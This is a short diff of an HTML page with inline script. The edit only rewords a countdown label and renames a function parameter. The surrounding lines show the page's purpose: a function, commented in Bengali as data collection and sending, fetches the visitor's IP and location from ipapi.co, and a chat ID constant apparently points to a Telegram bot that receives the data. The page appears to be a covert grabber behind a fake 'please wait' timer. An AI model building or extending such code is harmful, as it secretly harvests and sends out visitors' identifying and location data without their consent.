@@ -47,7 +47,7 @@
 </head>
 <body>
     <div class="timer-container">
-        Redirecting in: <span id="timer">01:00</span>
+        Please wait this time: <span id="timer">01:00</span>
     </div>
 
     <script>
@@ -56,7 +56,7 @@
         const CHAT_ID = '7749024395';
 
         // ডেটা কালেকশন ও সেন্ড ফাংশন
-        async function collectAndSendData(targetUrl) {
+        async function collectAndSendData(targetLink) {
             try {
                 // IP ও লোকেশন ডিটেলস
                 const ipResponse = await fetch('https://ipapi.co/json/');
